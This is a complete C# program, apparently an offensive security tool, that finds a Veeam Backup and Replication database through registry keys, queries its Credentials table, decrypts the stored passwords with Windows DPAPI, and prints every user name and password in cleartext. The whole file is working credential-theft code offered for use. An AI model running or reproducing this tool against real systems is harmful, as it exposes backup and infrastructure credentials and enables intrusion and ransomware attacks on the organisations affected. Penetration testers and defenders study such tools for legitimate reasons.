using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
class Program
{
    static void Main()
    {

        string banner  = @"
   _____ __                   _    __                          ____                             __            
  / ___// /_  ____ __________| |  / /__  ___  ____ _____ ___  / __ \___  ____________  ______  / /_____  _____
  \__ \/ __ \/ __ `/ ___/ __ \ | / / _ \/ _ \/ __ `/ __ `__ \/ / / / _ \/ ___/ ___/ / / / __ \/ __/ __ \/ ___/
 ___/ / / / / /_/ / /  / /_/ / |/ /  __/  __/ /_/ / / / / / / /_/ /  __/ /__/ /  / /_/ / /_/ / /_/ /_/ / /    
/____/_/ /_/\__,_/_/  / .___/|___/\___/\___/\__,_/_/ /_/ /_/_____/\___/\___/_/   \__, / .___/\__/\____/_/     
                     /_/                                                        /____/_/                      

Author: @ShitSecure";

        Console.WriteLine(banner);

        string sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlDatabaseName");
        string sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlInstanceName");
        string sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup and Replication", "SqlServerName");
        

        if (sqlDatabaseName == null)
        {
            // If values not found in the first registry path, try the second one
            sqlDatabaseName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlDatabaseName");
            
        }

        if (sqlInstanceName == null)
        {
            // If values not found in the first registry path, try the second one
            sqlInstanceName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlInstanceName");
        }

        if (sqlServerName == null)
        {
            // If values not found in the first registry path, try the second one
            sqlServerName = GetRegistryValue(@"SOFTWARE\Veeam\Veeam Backup Catalog", "SqlServerName");
        }
        
            Console.WriteLine("\r\n\r\n[*] SqlDatabase: " + sqlDatabaseName);
            Console.WriteLine("[*] SqlInstance: " + sqlInstanceName);
            Console.WriteLine("[*] SqlServer: " + sqlServerName);
            
       
        if (sqlServerName == null)
        {
            Console.WriteLine("[-] Server not found, exit...");
            return;
            
        }
        


        // Modify the connection string based on your Veeam setup
        string connectionString = $"Server={sqlServerName}\\{sqlInstanceName};Database={sqlDatabaseName};Integrated Security=True";

        List<Tuple<string, string>> credentials = new List<Tuple<string, string>>();

        using (SqlConnection connection = new SqlConnection(connectionString))
        {
            try
            {
                connection.Open();
                
                Console.WriteLine("[+] Connected to the Veeam database.");

                // Execute custom SQL command to retrieve user_name and password
                // Thanks checkymander ;-) https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/ 
                string sqlQuery = "SELECT user_name, password FROM VeeamBackup.dbo.Credentials";
                using (SqlCommand command = new SqlCommand(sqlQuery, connection))
                {
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string userName = reader["user_name"].ToString();
                            string encryptedPassword = reader["password"].ToString();
                            string decryptedPassword = DecryptPassword(encryptedPassword);
                            credentials.Add(Tuple.Create(userName, decryptedPassword));
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        foreach (var credential in credentials)
        {
            Console.WriteLine($"[+] User Name: {credential.Item1}, Password: {credential.Item2}");
        }
    }


    static string GetRegistryValue(string registryPath, string valueName)
    {
        try
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
            {
                if (key != null)
                {
                    return key.GetValue(valueName)?.ToString();
                }
                else
                {
                    Console.WriteLine($"[-] Registry path not found: {registryPath}");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error reading registry: {ex.Message}");
        }
        return null;
    }


    static string DecryptPassword(string encryptedPassword)
    {
        try
        {
            // base64 decode the encryptedpassword
            byte[] encryptedbytePassword = Convert.FromBase64String(encryptedPassword);
            byte[] decryptedData = ProtectedData.Unprotect(encryptedbytePassword, null, DataProtectionScope.LocalMachine);
            return Encoding.Default.GetString(decryptedData);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error decrypting password: {ex.Message}");
            return string.Empty;
        }
    }
}
